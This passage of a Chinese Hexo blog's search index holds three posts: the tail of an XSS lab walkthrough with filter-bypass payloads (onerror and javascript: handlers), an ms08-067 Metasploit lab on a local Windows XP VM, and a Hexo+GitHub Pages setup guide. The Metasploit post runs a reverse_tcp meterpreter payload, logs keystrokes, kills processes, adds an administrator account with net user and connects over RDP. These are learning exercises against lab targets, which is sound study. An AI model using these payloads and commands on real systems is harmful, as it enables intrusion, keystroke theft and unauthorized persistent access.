punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"src"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;body>&lt;span class="ng-include:'</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'">&lt;/span>&lt;/body>'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们提交的参数src的值被插入到了<span>标签的class属性值中，但是前面还有ng-include这样的字符。</span></p><p><strong>ng-include</strong>是angular js中的东西，ng-include指令用于包含外部的HTML文件。</p><h2 id="payload-13"><a href="#payload-13" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php">src<span class="token operator">=</span><span class="token string">'level1.php?name=&lt;img src=1 onerror=alert(1)>'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-php"><code class="language-php">src<span class="token operator">=</span><span class="token string">'level1.php?name=&lt;img src=1 onerror=alert(/xss/)>'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在img标签中，当src指向一个不明确的地址时，会执行onerror的语句。</p><h1 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h1><p>在level16.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明不能使用大小写绕过，将”script”,” “,”/“替换成了&amp;nbsp</p><h2 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h2><p>使用一个不需要闭合的标签，且可以用回车(回车用%a来表示)来将它们分开,构造语句：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup">&lt;img%0asrc=1%0aonerror=alert(‘xss’)></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h1><p>level17到level20因为一些浏览器的原因，无法显示图片</p><p>但其原理如下：</p><h2 id="payload-14"><a href="#payload-14" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>arg01<span class="token operator">=</span> onmousemove<span class="token operator">&amp;</span>arg02<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">/</span>xss<span class="token operator">/</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>arg01<span class="token operator">=</span>a<span class="token operator">&amp;</span>arg02<span class="token operator">=</span> onmousemove<span class="token operator">=</span><span class="token string">"alert(/xss/)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>arg01<span class="token operator">=</span> onclick<span class="token operator">&amp;</span>arg02<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输完之后，点击图片，触发鼠标，即可绕过。</p><p><strong>注意：以上每一种方法的空格都很重要！！！</strong></p><p>或者将a标签的href更改为如下内容，利用javascript伪协议</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>javascript:alert(‘xss’)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h1><p>与level17同理</p><h1 id="level-19-level20"><a href="#level-19-level20" class="headerlink" title="level 19-level20"></a>level 19-level20</h1><p>这两关与之前的很相似，只是在于输入的onmouseover事件会被当作普通文本，而双引号又被过滤因此也不能闭合进行绕过，可以F12手动加onmouseover事件通关。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ms08-067的相关应用</title>
      <link href="/posts/5a76.html"/>
      <url>/posts/5a76.html</url>
      
        <content type="html"><![CDATA[<p>本篇文章介绍关于msfconsole模块中ms08-067漏洞的一些实例应用。</p><span id="more"></span><h1 id="实验背景："><a href="#实验背景：" class="headerlink" title="实验背景："></a>实验背景：</h1><p>都是在虚拟机下进行的啦，靶机采用的是winxpens3，确保所用的靶机有相关的漏洞才能攻击成功哦。并且攻击机和靶机要处在同一局域网下才行哒，建议开启仅主机模式哦。还有一点，有些命令无效，可能是因为模式为普通用户模式，在命令前面使用sudo就好了，或者切换为root（su root)</p><h1 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h1><p>攻击机：kali             ip地址：192.168.127.139</p><p>靶机：winxpens3    ip地址：192.168.127.138</p><h1 id="ms08-067的相关应用"><a href="#ms08-067的相关应用" class="headerlink" title="ms08-067的相关应用"></a>ms08-067的相关应用</h1><h2 id="1、配置命令"><a href="#1、配置命令" class="headerlink" title="1、配置命令"></a>1、配置命令</h2><p>首先进入msfconsole界面，</p><pre class="line-numbers language-bash"><code class="language-bash">search ms08-067      <span class="token comment" spellcheck="true">#查找ms08-067漏洞</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到这个漏洞的基本信息：</p><img src="/posts/5a76/1.png" class><p>可以选择</p><pre class="line-numbers language-bash"><code class="language-bash">use 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用如下命令，一样的意思</p><pre class="line-numbers language-bash"><code class="language-bash">use exploit/windows/smb/ms08_067_netapi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择之后，发现提示信息，按照提示信息配置：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/5a76/2.png" class><p>然后输入</p><pre class="line-numbers language-bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看哪些是yes,即必填,如果它的Current Setting为空，则要对它进行设置，如</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> RHOSTS 192.168.127.138     <span class="token comment" spellcheck="true">#设置靶机地址</span><span class="token keyword">set</span> LHOST 192.168.127.139      <span class="token comment" spellcheck="true">#设置攻击机地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2、运行攻击"><a href="#2、运行攻击" class="headerlink" title="2、运行攻击"></a>2、运行攻击</h2><p>完成前面的配置之后，运行：</p><pre class="line-numbers language-bash"><code class="language-bash">run       <span class="token comment" spellcheck="true">#或者使用exploit,来实现攻击</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功进入如下界面：</p><img src="/posts/5a76/3.png" class><h2 id="3、使用screenshot命令可对靶机界面进行截图："><a href="#3、使用screenshot命令可对靶机界面进行截图：" class="headerlink" title="3、使用screenshot命令可对靶机界面进行截图："></a>3、使用screenshot命令可对靶机界面进行截图：</h2><pre class="line-numbers language-bash"><code class="language-bash">screenshot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>截图默认保存在/home/kali目录下（命令下面会显示文件保存的路径），进入文件路径可以看到截图。</p><img src="/posts/5a76/4.png" class><h2 id="4、查看并关闭靶机打开进程"><a href="#4、查看并关闭靶机打开进程" class="headerlink" title="4、查看并关闭靶机打开进程"></a>4、查看并关闭靶机打开进程</h2><p>可以先使用ps命令查看靶机打开的进程号</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后可以使用kill关闭靶机的某个进程</p><p>比如，靶机此时打开了记事本，我在攻击上使用ps查看的进程号为2516（这个进程号是随机变化的哈），使用如下命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">kill</span> 2516<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可关闭通过攻击机关闭靶机的记事本进程</p><img src="/posts/5a76/5.png" class><h2 id="5、监听靶机键盘内容"><a href="#5、监听靶机键盘内容" class="headerlink" title="5、监听靶机键盘内容"></a>5、监听靶机键盘内容</h2><p>同样先使用ps查看靶机此时的进程及进程号，得到此时靶机记事本进程为484（靶机已经重新打开记事本进程）</p><p>然后使用：</p><pre class="line-numbers language-bash"><code class="language-bash">migrate 484        <span class="token comment" spellcheck="true">#484为靶机开启的进程号</span>keyscan_start      <span class="token comment" spellcheck="true">#开启监听靶机键盘</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后在靶机上任意输一些内容，回到kali，然后输入以下命令，即可查看监听到的键盘内容</p><pre class="line-numbers language-bash"><code class="language-bash">keyscan_dump       <span class="token comment" spellcheck="true">#得到监听内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/5a76/6.png" class><h2 id="6、利用3389端口远程登录靶机"><a href="#6、利用3389端口远程登录靶机" class="headerlink" title="6、利用3389端口远程登录靶机"></a>6、利用3389端口远程登录靶机</h2><p>在Windows上创建一个名称为zt密码为pass的用户，并提升为管理员权限</p><pre class="line-numbers language-bash"><code class="language-bash">net user zt pass /add                   <span class="token comment" spellcheck="true">#创建新用户，用户名为zt密码为pass</span>net localgroup Administrators zt /add   <span class="token comment" spellcheck="true">#将用户加入Administrators组</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>确保靶机的3389端口已经打开，可以在kali上使用nmap扫描靶机地址查看靶机是否开启3389端口。</p><pre class="line-numbers language-bash"><code class="language-bash">nmap -F 192.168.127.138            <span class="token comment" spellcheck="true">#查看靶机是否开启3389端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/5a76/7.png" class><p>发现3389端口已经打开，进入下一步。</p><p>接下来重新打开一个终端，输入</p><pre class="line-numbers language-bash"><code class="language-bash">rdesktop 192.168.127.138      <span class="token comment" spellcheck="true">#远程登录靶机</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 回车后会自动弹出如图所示的登录窗口</p><img src="/posts/5a76/8.png" class><p>使用创建的账户zt,密码pass即可远程登录靶机</p><img src="/posts/5a76/9.png" class>]]></content>
      
      
      <categories>
          
          <category> msfconsole </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> msfconsole </tag>
            
            <tag> 攻击 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo + github 搭建博客</title>
      <link href="/posts/85e6.html"/>
      <url>/posts/85e6.html</url>
      
        <content type="html"><![CDATA[<p>本篇文章介绍了使用hexo+github创建博客的主要流程。我也是在考虑各方因素之后，选择了github.io的方式。优点嘛，就是免费加开源yyds！好了，进入正题。</p><span id="more"></span><h1 id="1、搭建本地环境"><a href="#1、搭建本地环境" class="headerlink" title="1、搭建本地环境"></a>1、搭建本地环境</h1><h2 id="1-1下载并安装nodejs"><a href="#1-1下载并安装nodejs" class="headerlink" title="1.1下载并安装nodejs"></a>1.1下载并安装<a href="https://nodejs.org/">nodejs</a></h2><p>安装时一路默认即可。</p><p>测试：打开cmd,输入以下测试，出现版本号即表示成功</p><pre class="line-numbers language-bash"><code class="language-bash">node -v<span class="token function">npm</span> -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/85e6/1.png" class><h2 id="1-2下载并安装git"><a href="#1-2下载并安装git" class="headerlink" title="1.2下载并安装git"></a>1.2下载并安装<a href="https://git-scm.com/downloads">git</a></h2><p>安装时也一路默认即可。</p><p>测试：打开cmd,输入如下测试，出现版本号</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> --version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/85e6/2.png" class><p>并且在桌面右键鼠标，出现如下两个图标即表示成功</p><img src="/posts/85e6/3.png" class><h1 id="2、注册Github账户（已有账户的可跳过此步）"><a href="#2、注册Github账户（已有账户的可跳过此步）" class="headerlink" title="2、注册Github账户（已有账户的可跳过此步）"></a>2、注册Github账户（已有账户的可跳过此步）</h1><h2 id="2-1进入github官网，注册账号即可"><a href="#2-1进入github官网，注册账号即可" class="headerlink" title="2.1进入github官网，注册账号即可"></a>2.1进入<a href="https://github.com/">github</a>官网，注册账号即可</h2><h2 id="2-2注册完成后，连接github"><a href="#2-2注册完成后，连接github" class="headerlink" title="2.2注册完成后，连接github"></a>2.2注册完成后，连接github</h2><p>在桌面右键，选择Git Bash Here，设置用户名和邮箱（创建github账户时的用户名和邮箱）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> config --global user.name <span class="token string">"Github 用户名"</span><span class="token function">git</span> config --global user.email <span class="token string">"Github 邮箱"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="3、添加加密密钥"><a href="#3、添加加密密钥" class="headerlink" title="3、添加加密密钥"></a>3、添加加密密钥</h1><h2 id="3-1创建ssh密钥"><a href="#3-1创建ssh密钥" class="headerlink" title="3.1创建ssh密钥"></a>3.1创建ssh密钥</h2><p>先检查一下本地是否有.ssh文件夹：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> ~/.ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果没有，则直接进入接下这一步，有的话，可以修改路径等</p><pre class="line-numbers language-bash"><code class="language-bash">ssh-keygen -t rsa -C <span class="token string">"Github 邮箱"</span> <span class="token comment" spellcheck="true">#注意ssh-keygen是直接连起来的，中间没有空格</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>默认回车，创建完成后，可得到两个文件（因为.ssh为隐藏文件，如果没有找到.ssh项目，可以先检查一下自己的文件是否勾选隐藏的项目。.ssh的默认路径为：C:\users\用户名.ssh)</p><pre class="line-numbers language-bash"><code class="language-bash">id_rsaid_rsa.pub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-2添加ssh密钥到github账户"><a href="#3-2添加ssh密钥到github账户" class="headerlink" title="3.2添加ssh密钥到github账户"></a>3.2添加ssh密钥到github账户</h2><p>将id_rsa.pub的内容全部复制下来，</p><p>进入github，点击setting页面，然后选择左边栏的 SSH and GPG keys，点击 New SSH key。</p><img src="/posts/85e6/4.png" class><p>Title随便命令，将复制下来的id_rsa.pub的内容粘贴到Key中，点击Add SSH key 完成添加。</p><img src="/posts/85e6/5.png" class><h2 id="3-3验证连接"><a href="#3-3验证连接" class="headerlink" title="3.3验证连接"></a>3.3验证连接</h2><p>在桌面右击鼠标，选择Git Bash Here，输入</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ssh</span> -T git@github.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>出现以下图片即表示成功：</p><img src="/posts/85e6/6.jpg" class><h1 id="4、创建github仓库"><a href="#4、创建github仓库" class="headerlink" title="4、创建github仓库"></a>4、创建github仓库</h1><ul><li><p>GitHub 主页右上角加号，选择 New repository</p></li><li><p>Repository name 中输入：用户名.github.io</p></li><li><p>Description 选填</p></li><li><p>勾选 “Add a README file”</p></li></ul><p><strong>注意：最新版的GitHub的默认分支为main,从下图可以看到（也可以自行更改为其他分支）</strong></p><p>创建后，博客地址为：https://用户名.github.io</p><img src="/posts/85e6/7.png" class><h1 id="5、安装hexo"><a href="#5、安装hexo" class="headerlink" title="5、安装hexo"></a>5、安装hexo</h1><h2 id="5-1安装"><a href="#5-1安装" class="headerlink" title="5.1安装"></a>5.1安装</h2><p>使用我们前面的环境npm即可一键安装hexo程序</p><p>鼠标右击，选择Git Bash Here，输入：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> -g hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-2测试"><a href="#5-2测试" class="headerlink" title="5.2测试"></a>5.2测试</h2><p>检查是否安装成功：</p><p>在cmd或者Git Bash Here里面输入：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>出现相关版本号即可</p><img src="/posts/85e6/8.jpg" class><h2 id="5-3初始化并安装所需组件："><a href="#5-3初始化并安装所需组件：" class="headerlink" title="5.3初始化并安装所需组件："></a>5.3初始化并安装所需组件：</h2><p>先新建一个文件夹，在该文件夹下右击鼠标，选择Git Bash Here，输入：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo init    <span class="token comment" spellcheck="true">#初始化</span><span class="token function">npm</span> <span class="token function">install</span>  <span class="token comment" spellcheck="true">#安装组件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者，直接这样运行：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo init 文件名称<span class="token function">cd</span> 文件路径<span class="token function">npm</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>完成后，启动服务器进行预览：</p><pre class="line-numbers language-bash"><code class="language-bash">hexo g     <span class="token comment" spellcheck="true">#生成静态页面，或者hexo generate</span>hexo s     <span class="token comment" spellcheck="true">#启动服务，或者hexo server</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时访问：<a href="http://localhost:4000，出现hexo默认页面，表示安装成功">http://localhost:4000，出现hexo默认页面，表示安装成功</a></p><img src="/posts/85e6/9.png" class><h1 id="6、部署hexo到GitHub-Pages"><a href="#6、部署hexo到GitHub-Pages" class="headerlink" title="6、部署hexo到GitHub Pages"></a>6、部署hexo到GitHub Pages</h1><p>前面五步已经能够实现在本地访问hexo,我们的真正目的是使其部署到GitHub Pages，通过网络能够访问它。</p><h2 id="6-1安装git部署插件hexo-deployer-git"><a href="#6-1安装git部署插件hexo-deployer-git" class="headerlink" title="6.1安装git部署插件hexo-deployer-git"></a>6.1安装git部署插件hexo-deployer-git</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-2修改-config-yml站点配置文件"><a href="#6-2修改-config-yml站点配置文件" class="headerlink" title="6.2修改_config.yml站点配置文件"></a>6.2修改_config.yml站点配置文件</h2><p>在你之前创建的目录下，找到_config.yml文件，并用记事本打开，</p><p>修改末尾的Deployment 部分,</p><p><strong>注意：冒号后面一定记得有个空格！！！</strong></p><pre class="line-numbers language-bash"><code class="language-bash">deploy:type: <span class="token function">git</span>repository: git@github.com:用户名/用户名.github.io.gitbranch: main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，</p><p>repository后面的地址可从如下图所示直接复制过来</p><img src="/posts/85e6/10.png" class><p>branch后面是前面提过的默认分支，默认为main,可以修改为其他的，我把默认分支修改为了master（那就要修改为branch: master)，修改方法如下：</p><img src="/posts/85e6/11.png" class><h2 id="6-3发布文章"><a href="#6-3发布文章" class="headerlink" title="6.3发布文章"></a>6.3发布文章</h2><p>进入之前所创建的hexo的所在目录，右键Git Bash Here ，输入</p><pre class="line-numbers language-bash"><code class="language-bash">hexo new <span class="token string">"first"</span> <span class="token comment" spellcheck="true">#创建名为"first"的文章，""里面的标题可自行命名</span>hexo g <span class="token comment" spellcheck="true">#生成静态页面</span>hexo d <span class="token comment" spellcheck="true">#将文章部署到GitHub pages，或者hexo deploy</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时，访问我们的GitHub域名，即：https://用户名.github.io 就可以看到hexo网站啦！`</p><h1 id="常用的hexo命令"><a href="#常用的hexo命令" class="headerlink" title="常用的hexo命令"></a>常用的hexo命令</h1><pre class="line-numbers language-bash"><code class="language-bash">hexo new <span class="token string">"name"</span>         <span class="token comment" spellcheck="true"># 新建文章</span>hexo new page <span class="token string">"name"</span>    <span class="token comment" spellcheck="true"># 新建页面</span>hexo g                  <span class="token comment" spellcheck="true"># 生成页面</span>hexo d                  <span class="token comment" spellcheck="true"># 部署</span>hexo g -d               <span class="token comment" spellcheck="true"># 生成页面并部署</span>hexo s                  <span class="token comment" spellcheck="true"># 本地预览</span>hexo clean              <span class="token comment" spellcheck="true"># 清除缓存和已生成的静态文件</span>hexo <span class="token function">help</span>               <span class="token comment" spellcheck="true"># 帮助</span>hexo --debug            <span class="token comment" spellcheck="true"># 调试模式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
